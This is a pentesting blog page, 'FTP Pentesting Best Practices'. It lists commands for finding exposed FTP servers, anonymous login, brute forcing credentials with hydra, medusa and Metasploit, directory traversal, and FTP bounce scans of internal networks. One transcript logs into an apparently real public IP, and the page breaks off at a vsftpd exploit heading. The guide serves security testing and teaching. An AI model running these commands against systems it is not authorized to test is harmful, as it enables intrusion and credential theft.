<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="FTP Pentesting Best Practices" /><meta property="og:locale" content="en" /><meta name="description" content="FTP" /><meta property="og:description" content="FTP" /><link rel="canonical" href="https://secybr.com/posts/ftp-pentesting-best-practices/" /><meta property="og:url" content="https://secybr.com/posts/ftp-pentesting-best-practices/" /><meta property="og:site_name" content="secybr penetration testing, red teaming and hack tricks." /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-04T00:00:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="FTP Pentesting Best Practices" /><meta name="twitter:site" content="@0xhav0c" /><meta name="google-site-verification" content="405asbYxUs5N1iqL1zGg56yq-OlAtdexlSaC3FC7c9s" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-22T14:45:45+03:00","datePublished":"2022-06-04T00:00:00+03:00","description":"FTP","headline":"FTP Pentesting Best Practices","mainEntityOfPage":{"@type":"WebPage","@id":"https://secybr.com/posts/ftp-pentesting-best-practices/"},"url":"https://secybr.com/posts/ftp-pentesting-best-practices/"}</script><title>FTP Pentesting Best Practices | secybr | penetration testing, red teaming and hack tricks.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="secybr | penetration testing, red teaming and hack tricks."><meta name="application-name" content="secybr | penetration testing, red teaming and hack tricks."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><meta content="secybr | penetration testing, red teaming and hack tricks." property="og:site_name"><meta content="FTP Pentesting Best Practices" property="og:title"><meta content="article" property="og:type"><meta content="penetration testing, red teaming and hack tricks." property="og:description"><meta content="https://secybr.com/posts/ftp-pentesting-best-practices/" property="og:url"><meta content="2022-06-04T00:00:00+03:00" property="article:published_time"><meta content="https://secybr.com/about/" property="article:author"><meta content="https://secybr.com/assets/img/logo/logo.png" property="og:image"><meta content="pentesting protocols" property="article:section"><meta content="pentesting" property="article:tag"><meta content="ftp" property="article:tag"><meta content="best practicies" property="article:tag"><meta property="og:image" content="https://secybr.com/assets/img/logo/logo.png"><meta name="twitter:site" content="secybr"><meta name="twitter:creator" content="0xhav0c"><meta name="twitter:title" content="FTP Pentesting Best Practices"><meta name="twitter:description" content="penetration testing, red teaming and hack tricks."><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://secybr.com/assets/img/logo/logo.png"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6320091248407168" crossorigin="anonymous"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/logo/logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">secybr</a></div><div class="site-subtitle">is a product of 0xhav0c</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>WHO AM I?</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xhav0c" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xhav0c" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xhavocc','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>FTP Pentesting Best Practices</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>FTP Pentesting Best Practices</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1654290000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 4, 2022 </em> </span> <span> Updated <em class="" data-ts="1661168745" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 22, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/0xhav0c">0xhav0c</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1928 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h1 id="ftp">FTP</h1><blockquote class="prompt-tip"><div><p>FTP usually uses port 21</p></div></blockquote><h1 id="what-is-ftp">What is FTP?</h1><p>FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP/IP (Transmission Control Protocol/Internet Protocol) network, aka the internet. Users, who have been granted access, can receive and transfer files in the File Transfer Protocol server (also known as FTP host/site).</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>PORT     STATE SERVICE               VERSION
21/tcp   open  ftp                   ProFTPD 1.3.5  
</pre></table></code></div></div><h1 id="ftp-pentesting">FTP Pentesting</h1><div class="table-wrapper"><table><thead><tr><th><img data-src="https://www.shodan.io/static/img/favicon.png" alt="https://www.shodan.io/static/img/favicon.png" width="20px" data-proofer-ignore> Shodan search query :<tbody><tr><td><code class="language-plaintext highlighter-rouge">port:21</code><tr><td># Anonymous FTP Login query: <code class="language-plaintext highlighter-rouge">"220" "230 Login successful." port:21</code></table></div><h2 id="banner-grabbing"><span class="mr-2">Banner Grabbing</span><a href="#banner-grabbing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>telnet 10.10.x.x 21
nc <span class="nt">-nv</span> 10.10.x.x 21
nmap <span class="nt">-sV</span> <span class="nt">-p21</span> <span class="nt">--script</span><span class="o">=</span>banner 10.10.x.x

<span class="c">#Get certificate if any</span>
openssl s_client <span class="nt">-connect</span> 10.10.x.x:21 <span class="nt">-starttls</span> ftp 
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/ftp/ftp.png" alt="FTP Banner grabbing with nmap banner script" data-proofer-ignore> <em>FTP Banner grabbing with nmap banner script</em></p><h2 id="ftp-connection-tools"><span class="mr-2">FTP Connection Tools</span><a href="#ftp-connection-tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Linux:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ftp 10.10.x.x
<span class="c"># if FTP server running on different port and using ssl </span>
ftp-ssl 10.10.x.x 990
</pre></table></code></div></div><p>Windows:</p><ul><li>Filezilla<li>Winscp</ul><h3 id="connect-to-ftp-using-starttls"><span class="mr-2">Connect to FTP using starttls</span><a href="#connect-to-ftp-using-starttls" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>lftp
lftp :~&gt; <span class="nb">set </span>ftp:ssl-force <span class="nb">true
</span>lftp :~&gt; <span class="nb">set </span>ssl:verify-certificate no
lftp :~&gt; connect 10.10.x.x
lftp 10.10.x.x:~&gt; login                       
Usage: login &lt;user|URL&gt; <span class="o">[</span>&lt;pass&gt;]
lftp 10.10.x.x:~&gt; login username Password
</pre></table></code></div></div><h3 id="browser-connection"><span class="mr-2">Browser Connection</span><a href="#browser-connection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>ftp://ftp.xyz.com 
ftp://anonymous:anonymous@10.10.x.x <span class="c"># Anonymous login</span>
ftp://username:password@ftp.secybr.com <span class="c"># To connect to a FTP server requiring a username with Firefox,</span>
ftp://0xhav0c:password@ftp.secybr.com <span class="c"># if my User name was 0xhav0c and my password was password, the FTP browser syntax would be:</span>
ftp://0xhav0c@secybr.com:password@ftp.secybr.com <span class="c"># In some cases, the User name includes a domain name such as 0xhav0c@secybr.com. In these situations, you would type:</span>
</pre></table></code></div></div><h3 id="mount-remote-ftp-locally"><span class="mr-2">Mount remote FTP locally</span><a href="#mount-remote-ftp-locally" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>apt-get <span class="nb">install </span>curlftpfs
<span class="nb">mkdir</span> /mnt/my_ftp
curlftpfs ftp-user:ftp-pass@my-ftp-location.local /mnt/my_ftp/
curlftpfs <span class="nt">-o</span> allow_other ftp-user:ftp-pass@my-ftp-location.local /mnt/my_ftp/ <span class="c"># To allow other users</span>
</pre></table></code></div></div><h3 id="download-everything-from-ftp-server"><span class="mr-2">Download Everything From FTP Server</span><a href="#download-everything-from-ftp-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>root@Kali:~/ wget <span class="nt">-m</span> <span class="nt">--no-passive</span> ftp://anonymous:anonymous@10.10.x.x 
<span class="nt">--2022-06-04</span> 21:03:50-- 
ftp://anonymous:<span class="k">*</span>password<span class="k">*</span>@10.10.x.x/ 

<span class="o">=&gt;</span> ‘10.10.x.x/.listing’ 
Connecting to 10.10.x.x:21... connected. 
Logging <span class="k">in </span>as anonymous ... Logged <span class="k">in</span><span class="o">!</span> 
<span class="o">==&gt;</span> SYST ... <span class="k">done</span><span class="nb">.</span> <span class="o">==&gt;</span> PWD ... <span class="k">done</span><span class="nb">.</span> 
<span class="o">==&gt;</span> TYPE I ... <span class="k">done</span><span class="nb">.</span> <span class="o">==&gt;</span> CWD not needed. 
<span class="o">==&gt;</span> PORT ... <span class="k">done</span><span class="nb">.</span> <span class="o">==&gt;</span> LIST ... <span class="k">done</span><span class="nb">.</span> 
10.10.x.x/.listing <span class="o">[</span> &lt;<span class="o">=&gt;</span> <span class="o">]</span> 97 <span class="nt">--</span>.-KB/s <span class="k">in </span>0s 
<span class="o">==&gt;</span> PORT ... <span class="k">done</span><span class="nb">.</span> <span class="o">==&gt;</span> LIST ... <span class="k">done</span><span class="nb">.</span> 
10.10.x.x/.listing <span class="o">[</span> &lt;<span class="o">=&gt;</span> <span class="o">]</span> 97 <span class="nt">--</span>.-KB/s <span class="k">in </span>0s  
2022-06-04 21:03:50 <span class="o">(</span>8.4 MB/s<span class="o">)</span> - ‘10.10.x.x/.listing’ saved <span class="o">[</span>194] 
<span class="nt">--2022-06-04</span> 21:03:50-- 
ftp://anonymous:<span class="k">*</span>password<span class="k">*</span>@10.10.x.x/Backups/ 

<span class="o">=&gt;</span> ‘10.10.x.x/Backups/.listing’ 
<span class="o">==&gt;</span> CWD <span class="o">(</span>1<span class="o">)</span> /Backups ... <span class="k">done</span><span class="nb">.</span> 
<span class="o">==&gt;</span> PORT ... <span class="k">done</span><span class="nb">.</span> <span class="o">==&gt;</span> LIST ... <span class="k">done</span><span class="nb">.</span>
</pre></table></code></div></div><h2 id="ftp-credentials"><span class="mr-2">FTP Credentials</span><a href="#ftp-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-tip"><div><p>It might be helpful to try the passive mode. Sometimes it may allow you to connect in passive mode (<code class="language-plaintext highlighter-rouge">ftp -p 192.168.x.x</code>).In Active FTP the FTP client first initiates the control connection from its port N to FTP Servers command port – port 21. The client then listens to port N+1 and sends the port N+1 to FTP Server. FTP Server then initiates the data connection, from its port M to the port N+1 of the FTP Client. But, if the FTP Client has a firewall setup that controls the incoming data connections from outside, then active FTP may be a problem. And, a feasible solution for that is <strong>Passive FTP</strong>. In Passive FTP, the client initiates the control connection from its port N to the port 21 of FTP Server. After this, the client issues a passv comand. The server then sends the client one of its port number M. And the client initiates the data connection from its port P to port M of the FTP Server.</p></div></blockquote><p><img data-src="/assets/img/pitcures/ftp/ftp1.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/pitcures/ftp/ftp2.png" alt="Untitled" data-proofer-ignore></p><center><iframe width="560" height="315" src="https://www.youtube.com/embed/8X-DZUIZa94" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></center><blockquote class="prompt-warning"><div><p>File upload (<code class="language-plaintext highlighter-rouge">PUT FileName.exe</code>) or download (<code class="language-plaintext highlighter-rouge">GET FileName.txt</code>; <code class="language-plaintext highlighter-rouge">mget FileName.txt</code>) operations can be performed after login. In order for the file to be loaded to be added without being corrupted, the mode must be changed with the “binary” commands if this file is in binary format, and “ascii” commands if it is in ASCII format.</p></div></blockquote><h3 id="anonymous-login-check-methods"><span class="mr-2">Anonymous Login Check Methods</span><a href="#anonymous-login-check-methods" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="c">#Manual Anonymous Login Combos</span>
anonymous : anonymous
anonymous :
ftp : ftp

<span class="c">#Manual Anonymous Login With ftp-ssl</span>
root@secyber.com:~ ftp-ssl <span class="nt">-p</span> 88.255.104.161 990
Connected to 88.255.104.161.
220 Service Ready.
Name <span class="o">(</span>88.255.104.161:root<span class="o">)</span>: anonymous
234 Enabling TLS Connection
<span class="o">[</span>SSL Cipher ECDHE-RSA-AES256-GCM-SHA384]
502 Not supported
502 Not supported
331 Username ok, need password
Password:
230 User logged <span class="k">in
</span>Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.

<span class="c">#Anonymous Login Check With Metasploit Framework</span>
msf <span class="o">&gt;</span> use auxiliary/scanner/ftp/anonymous
<span class="nb">set </span>RHOSTS 10.10.x.x
<span class="nb">set </span>RPORT 21
run

<span class="c">#Nmap Script:</span>
nmap <span class="nt">--script</span><span class="o">=</span>ftp-anon <span class="nt">-p21</span> 10.10.x.x
<span class="c">#or</span>
nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span> 10.10.x.x
</pre></table></code></div></div><h3 id="valid-users-and-password-detection-methods"><span class="mr-2">Valid Users and Password Detection Methods</span><a href="#valid-users-and-password-detection-methods" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>msf <span class="o">&gt;</span> use auxiliary/scanner/ftp/ftp_login
<span class="nb">set </span>RHOSTS 10.10.x.x
<span class="nb">set </span>RPORT 21
<span class="nb">set </span>PASS_FILE /usr/share/wordlists/passwords.txt
<span class="nb">set </span>USER_FILE /usr/share/wordlists/users.txt
run

<span class="c">#Nmap Script:</span>
nmap <span class="nt">--script</span> ftp-brute <span class="nt">-p21</span> 10.10.x.x
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/ftp/ftp3.png" alt="Untitled" data-proofer-ignore></p><p>To connect to FTP, anyone can log in to the server if anonymous login is allowed by the administrator. An attacker can log in anonymously using the metasploit exploit or using the “ftp” tool.</p><h3 id="ftp-brute-forcing-methods"><span class="mr-2">FTP Brute Forcing Methods</span><a href="#ftp-brute-forcing-methods" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>hydra <span class="nt">-t</span> 2 <span class="nt">-L</span> user.list <span class="nt">-P</span> passwords.list <span class="nt">-M</span> targetIPs.list <span class="nt">-s</span> 21 ftp
medusa <span class="nt">-t</span> 2 <span class="nt">-T</span> 2 <span class="nt">-U</span> user.list <span class="nt">-P</span> passwords.list <span class="nt">-H</span> targetIPs.list <span class="nt">-n</span> 21 <span class="nt">-M</span> ftp
ncrack <span class="nt">-g</span> <span class="nv">CL</span><span class="o">=</span>2 <span class="nt">-U</span> user.list <span class="nt">-P</span> passwords.list <span class="nt">-iL</span> targetIPs.list <span class="nt">-p</span> ftp:21 <span class="nt">-oA</span> results.txt
patator ftp_login <span class="nv">host</span><span class="o">=</span>10.10.x.x <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">password</span><span class="o">=</span>FILE1 <span class="nv">0</span><span class="o">=</span>users.list <span class="nv">1</span><span class="o">=</span>passwords.list <span class="nt">-x</span> ignore:mesg<span class="o">=</span>’Login incorrect.’ <span class="nt">-x</span> ignore,reset,retry:code<span class="o">=</span>500

<span class="c">#Metasploit Framework:</span>
msf <span class="o">&gt;</span> use auxiliary/scanner/ftp/login
<span class="nb">set </span>RHOSTS 10.10.x.x
<span class="nb">set </span>RPORT 21
<span class="nb">set </span>PASS_FILE /usr/share/wordlists/passwords.txt
<span class="nb">set </span>USER_FILE /usr/share/wordlists/users.txt
run
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/ftp/ftp4.png" alt="Untitled" data-proofer-ignore></p><h2 id="common-ftp-vulnerabilities"><span class="mr-2">Common FTP Vulnerabilities</span><a href="#common-ftp-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="directory-traversal-attack"><span class="mr-2">Directory Traversal Attack</span><a href="#directory-traversal-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with “dot-dot-slash (../)” sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.</p><p>Directory Traversal vulnerabilities can be generally divided into two types:</p><ul><li><strong>Information Disclosure</strong>: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.<li><strong>Writing arbitrary files</strong>: Allows the attacker to create or replace existing files. This type of vulnerability is also known as <code class="language-plaintext highlighter-rouge">Zip-Slip</code>.</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="c"># ftp 192.168.13.22</span>
Connected to 192.168.13.22.
220 Femitter FTP Server ready.
Name <span class="o">(</span>192.168.13.22:root<span class="o">)</span>: 
331 Password required <span class="k">for </span>root.
Password:
230 User root logged <span class="k">in</span><span class="nb">.</span>
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls</span> ../../../../
200 Port <span class="nb">command </span>successful.
150 Opening data connection <span class="k">for </span>directory list.
<span class="nt">-rwxrwxrwx</span>   1 ftp      ftp            0 Sep 23  2015 AUTOEXEC.BAT
<span class="nt">-rw-rw-rw-</span>   1 ftp      ftp            0 Sep 23  2015 CONFIG.SYS
drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 Documents and Settings
dr--r--r--   1 ftp      ftp            0 Sep 23  2015 Program Files
drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 WINDOWS
226 File sent ok
ftp&gt; <span class="nb">ls</span> ../../../../Docume~1/
200 Port <span class="nb">command </span>successful.
150 Opening data connection <span class="k">for </span>directory list.
drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 <span class="nb">.</span>
drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 ..
drw-rw-rw-   1 ftp      ftp            0 Sep 26  2015 Administrateur
drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 All Users
226 File sent ok
</pre></table></code></div></div><h3 id="ftp-bounce-vulnerability"><span class="mr-2">FTP Bounce Vulnerability</span><a href="#ftp-bounce-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The FTP server is vulnerable to FTP bounce attacks. This vulnerability allows an FTP client to instruct the FTP server to make an outbound data connection to any IP and port, rather than restricting outbound connections back to the client’s IP address only. This can be used to map and port scan any networks visible to the FTP server, possibly including internal networks not directly accessible to the attacker.</p><p><img data-src="/assets/img/pitcures/ftp/ftp5.png" alt="Untitled" data-proofer-ignore></p><p>FTP bouncing is such a popular and easy to exploit reconnaissance attack that tools such as nmap include an FTP bounce scan option.</p><h4 id="ftp-bounce-vulnerability-check-method"><span class="mr-2">FTP Bounce Vulnerability Check Method</span><a href="#ftp-bounce-vulnerability-check-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">--script</span> ftp-bounce <span class="nt">-p21</span> 10.10.x.x
msf <span class="o">&gt;</span> use auxiliary/scanner/portscan/ftpbounce
</pre></table></code></div></div><p>Lastly, you can check manually. If your FTP server is impacted from this vulnerability, you will have a result similar to the following:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>USER A
331 Username okay, awaiting password
PASS A
230 User logged <span class="k">in</span>, proceed
PORT 172,19,0,100,0,1234
200 The requested action has been successfully completed 
LIST
150 File status okay<span class="p">;</span> about to open data connection // We understood port 1234 is open
226 Closing data connection 
PORT 172,19,0,100,0,4444
200 The requested action has been successfully completed 
LIST
425 No connection established // We understood port 4444 is closed
</pre></table></code></div></div><p>For example, an attacker using this vulnerability can scan ports in the internal network systems by using the following command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-v</span> <span class="nt">-p</span> 21,22,445,80,443 <span class="nt">-b</span> username:password@172.19.0.100 192.168.0.1/24
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/ftp/ftp6.png" alt="Unsuccess FTP Bounce scan example output." data-proofer-ignore> <em>Unsuccess FTP Bounce scan example output.</em></p><p><img data-src="/assets/img/pitcures/ftp/ftp7.png" alt="Success FTP Bounce scan example output." data-proofer-ignore> <em>Success FTP Bounce scan example output.</em></p><h3 id="specific-vulnerabilities-and-exploits-pocs-and-nmap-scripts"><span class="mr-2">Specific Vulnerabilities and Exploits, PoC’s and Nmap Scripts</span><a href="#specific-vulnerabilities-and-exploits-pocs-and-nmap-scripts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="c">#OPIE &lt;= 2.4.1-test1 @ FreeBSD 6.4 – 8.1-PRERELEASE [CVE-2010-1938]</span>
nmap <span class="nt">--script</span><span class="o">=</span>ftp-libopie <span class="nt">-p21</span> 10.10.x.x

<span class="c">#VSFTPD 2.3.4 [CVE-2011-2523]</span>
